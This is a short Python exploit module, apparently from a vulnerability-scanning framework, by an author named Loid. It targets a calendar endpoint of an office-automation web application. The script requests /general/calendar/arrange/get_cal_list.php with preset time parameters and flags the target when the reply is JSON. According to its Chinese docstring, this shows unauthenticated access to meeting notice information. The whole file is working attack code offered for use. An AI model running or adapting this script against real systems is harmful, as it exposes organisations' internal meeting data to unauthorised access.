"""
link:
author: Loid
未授权访问会议通知信息
"""
import requests


class Exploit(object):

    def attack(self, url):
        target = url + "/general/calendar/arrange/get_cal_list.php?starttime=154805" \
                       "8874&endtime=1597997506&view=agendaDay"
        r = requests.get(target)

        if "application/json" in r.headers['Content-Type']:
            return "{} 未授权访问会议通知信息".format(target)
